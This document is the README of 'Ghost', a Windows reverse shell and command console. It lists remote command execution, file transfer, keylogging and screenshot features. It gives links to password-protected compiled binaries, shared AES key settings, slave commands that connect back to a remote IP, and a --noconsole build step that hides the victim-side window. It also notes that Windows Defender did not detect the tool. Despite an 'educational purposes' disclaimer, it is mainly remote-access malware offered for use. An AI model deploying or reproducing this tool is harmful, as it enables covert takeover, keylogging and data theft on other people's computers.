# Ghost
Reverse shell and management console for Windows. Communication between the reverse shell and the management console is AES encrypted. Reverse shell and management console support tcp and udp protocols. 


Some of its features are
-------------------------

-Sends commands to cmd and powershell,

-Creates or extracts zip files

-Downloads files from the Internet,

-Supports file upload and download,

-Creates keylogger program,

-Takes a screenshot

-Communication between server and client is AES encrypted.

The compiled version of the program can be downloaded from the links below.
--------------------------------------------------------------------------
1) Compiled without using the "--noconsole" command 
  
  ghost_v4_showconsole.rar ==> zip password: "ghost_v4"

  https://drive.google.com/file/d/1HP1k290aP3AUrUK29sgq-GRfaxSKxcJJ/view?usp=sharing

2) Compiled using the "--noconsole" command

  ghost_v4_noconsole.rar ==> zip password: "ghost_v4"

  https://drive.google.com/file/d/18KQ2JjyOAwZ34Gn_hYyUJMPNq6XeqhhS/view?usp=sharing


Requirements
-------------------
Required libraries:  pycryptodome , requests, pyautogui, pyinstaller

>> pip install pycryptodome

>> pip install  requests

>> pip install pyautogui

>> pip install pyinstaller

"pyinstaller" will be used to make the code one piece executable


Settings
--------------

>> (1) master.py

![master](https://user-images.githubusercontent.com/71177413/162610379-f8baa1f8-050a-4923-90fe-287267a8e994.JPG)

    CRTYPTO_KEY     =  b'A45iPxLo908RYe3Wq034TueWvCxz3618'      # 32 bit(s) AES key  (changeable) [The value for "slave.py" should be the same.]
    CRTYPTO_NUMBER  =  71                                       # Second key to strengthen encryption. It must be between 1 and 128. (changeable) [The value for "slave.py" should be the same.]
    SOCKET_PROTOCOL = "UDP"                                     # "TCP" or "UDP" (changeable)
    SOCKET_HOST     = "0.0.0.0"                                 # This value in "master.py" should not be changed in order for "slave.py" to be connected.
    SOCKET_PORT     = 9292                                      # "slave.py" must be the same port. (changeable)
    SYSTEM_ENCODE   = "cp857"                                   # TURKISH CHARACTER SET (changeable; example utf-8, latin1 etc.)
    SYSTEM_DEFAULTTIMEOUT = 0                                   # No timeout. It is recommended to set the value to "0" for master.py.
    
    
   
   >> (2) slave.py
   
   ![slave](https://user-images.githubusercontent.com/71177413/162610823-5da57505-edf6-44c1-b7a9-74a3062beab6.JPG)
   
    CRTYPTO_KEY     =  b'A45iPxLo908RYe3Wq034TueWvCxz3618'      # 32 bit(s) AES key  (changeable) [The value for "slave.py" should be the same.]
    CRTYPTO_NUMBER  =  71                                       # Second key to strengthen encryption. It must be between 1 and 128. (changeable) [The value for "slave.py" should be the same.]
    SOCKET_PROTOCOL = "UDP"                                     # "TCP" or "UDP" (changeable)
    SOCKET_HOST     = "127.0.0.1"                               # The IP to which "slave.py" will be connected
    SOCKET_PORT     = 9292                                      # "master.py" must be the same port. (changeable)
    SYSTEM_ENCODE   = "cp857"                                   # TURKISH CHARACTER SET
    SYSTEM_DEFAULTTIMEOUT = 300                                 # 5 minutes; It is recommended to be non-zero for "UDP". When the connection is lost or an error occurs, "slave.py" tries to connect again after this period. At the same time, if it does not receive a command from "master.py" within this time, it tries to connect again. Therefore, setting a very low value is also not appropriate.
    
  
>>Except for encryption, these values can be changed with initial parameters if desired.

master.exe -h      ==> Shows help parameters.

slave -h           ==> Not shows help parameters because of the parameter ("--noconsole") used while compiling

Example:

master -udp -c:cp857  -t:00 8080             ==> (8080 port)

master -tcp -c:utf-8  -t:600 9393            ==> (9393 port)

master 7272                                  ==> (7272 port)

slave  -udp -c:cp857  -t:600 1.1.1.1:8080    ==> (1.1.1.1 ip - 8080 port)

slave  -tcp -c:utf-8  -t:00  1.1.1.1:9393    ==> (1.1.1.1 ip - 9393 port)

slave 3.3.3.3:7272                           ==> (3.3.3.3 ip - 7272 port)

![1](https://user-images.githubusercontent.com/71177413/162611487-baabc2aa-2c37-4a9b-b178-74dbb8d08d75.JPG)

![2](https://user-images.githubusercontent.com/71177413/162611490-e24ad077-5b4d-4a33-8ac9-c72f24d91829.JPG)


compilation
------------

(show console for slave.py)

>>pyinstaller --onefile --icon=master.ico master.py

>>pyinstaller --onefile --icon=slave.ico slave.py

or (hide console for slave.py)

>>pyinstaller --onefile --icon=master.ico master.py

>>pyinstaller --onefile --noconsole --icon=slave.ico slave.py


Commands for master.py
-----------------------

>> commands      ==> Shows commands very briefly.

![3](https://user-images.githubusercontent.com/71177413/162611768-9e3e7ad6-298a-4c7d-b907-320f2696003a.JPG)


>> help          ==> Shows commands in detail.

![4](https://user-images.githubusercontent.com/71177413/162611775-ed01e4f7-4dfb-4aa0-a6cb-9b7877528e1f.JPG)


Notes
-------
First, master.py should be run, then slave.py should be run. Otherwise, slave.py will wait for the timeout and try to connect again.



Some images of the working of the program
------------------------------------

[1] 

![5](https://user-images.githubusercontent.com/71177413/162612140-749b42ed-b450-4a60-a43d-00e3f2eea801.JPG)


[2]

![6](https://user-images.githubusercontent.com/71177413/162612197-5cf920c1-8d3e-4647-99b5-a45b408cf275.JPG)


[3]

![11](https://user-images.githubusercontent.com/71177413/162612212-a7019220-d3db-4024-9d3a-f548e902b32b.JPG)


[4]

![7](https://user-images.githubusercontent.com/71177413/162612297-5da94b20-8b7f-40ec-92e4-1733e6a58059.JPG)


[5]

![8](https://user-images.githubusercontent.com/71177413/162612229-110697a1-b587-4bc2-ada1-1742538f4fb1.JPG)


[6]

![10](https://user-images.githubusercontent.com/71177413/162612315-b7bf2aa0-f349-4e85-b22c-aab987ca43d1.JPG)


Windows Defender
-----------------
As of 10/04/2022, It is not caught by the Windows Defender program. Over time this will change.


legal warning
------------------
Run your tests on virtual machines. The responsibility for illegal use belongs to the user. Shared for educational purposes.

